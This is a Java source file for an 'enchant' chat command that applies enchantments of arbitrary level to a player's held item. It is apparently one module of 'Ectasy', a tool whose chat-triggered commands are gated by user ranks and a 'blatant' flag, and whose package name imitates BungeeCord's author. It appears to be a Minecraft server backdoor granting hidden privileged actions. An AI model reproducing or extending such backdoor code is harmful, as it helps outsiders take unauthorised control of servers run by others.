package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Material;
import org.bukkit.enchantments.EnchantmentWrapper;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "enchant",
   description = "Enchants the holded item.",
   blatant = false,
   rank = Rank.LITE
)
public class EnchantCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent event, String string, String[] args) {
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length < 2) {
               ChatUtil.sendChat(
                       event.getPlayer(), "Please, use enchant <enchantment name> <lvl> (If an enchantment has a space in it, use an underscore instead)"
               );
            } else {
               ItemStack var1 = event.getPlayer().getItemInHand();
               if (var1.getType() == Material.AIR) {
                  ChatUtil.sendChat(event.getPlayer(), "Please, hold an item to enchant.");
               } else {
                  String var2 = args[0].toUpperCase();
                  if (var2.equalsIgnoreCase("Protection")) {
                     var2 = "PROTECTION_ENVIRONMENTAL";
                  }

                  if (var2.equalsIgnoreCase("Fire_Protection")) {
                     var2 = "PROTECTION_FIRE";
                  }

                  if (var2.equalsIgnoreCase("Feather_Falling")) {
                     var2 = "PROTECTION_FALL";
                  }

                  if (var2.equalsIgnoreCase("Blast_Protection")) {
                     var2 = "PROTECTION_EXPLOSIONS";
                  }

                  if (var2.equalsIgnoreCase("Projectile_Protection")) {
                     var2 = "PROTECTION_PROJECTILE";
                  }

                  if (var2.equalsIgnoreCase("Respiration")) {
                     var2 = "OXYGEN";
                  }

                  if (var2.equalsIgnoreCase("Aqua_Affinity")) {
                     var2 = "WATER_WORKER";
                  }

                  if (var2.equalsIgnoreCase("Sharpness")) {
                     var2 = "DAMAGE_ALL";
                  }

                  if (var2.equalsIgnoreCase("Smite")) {
                     var2 = "DAMAGE_UNDEAD";
                  }

                  if (var2.equalsIgnoreCase("Bane_Of_Arthropods")) {
                     var2 = "DAMAGE_ARTHROPODS";
                  }

                  if (var2.equalsIgnoreCase("Looting")) {
                     var2 = "LOOT_BONUS_MOBS";
                  }

                  if (var2.equalsIgnoreCase("Efficiency")) {
                     var2 = "DIG_SPEED";
                  }

                  if (var2.equalsIgnoreCase("Unbreaking")) {
                     var2 = "DURABILITY";
                  }

                  if (var2.equalsIgnoreCase("Fortune")) {
                     var2 = "LOOT_BONUS_BLOCKS";
                  }

                  if (var2.equalsIgnoreCase("Power")) {
                     var2 = "ARROW_DAMAGE";
                  }

                  if (var2.equalsIgnoreCase("Punch")) {
                     var2 = "ARROW_KNOCKBACK";
                  }

                  if (var2.equalsIgnoreCase("Flame")) {
                     var2 = "ARROW_FIRE";
                  }

                  if (var2.equalsIgnoreCase("Infinity")) {
                     var2 = "ARROW_INFINITE";
                  }

                  ItemMeta var4 = var1.getItemMeta();
                  if (EnchantmentWrapper.getByName(var2) == null) {
                     ChatUtil.sendChat(event.getPlayer(), "The enchantment wasn't found.");
                  } else {
                     int var3;
                     try {
                        var3 = Integer.parseInt(args[1]);
                     } catch (Exception var6) {
                        ChatUtil.sendChat(event.getPlayer(), "Invalid integer (Max : 32727)");
                        return;
                     }

                     var4.addEnchant(EnchantmentWrapper.getByName(var2), var3, true);
                     var1.setItemMeta(var4);
                     ChatUtil.sendChat(event.getPlayer(), "Your item has been successfully enchanted.");
                  }
               }
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
}
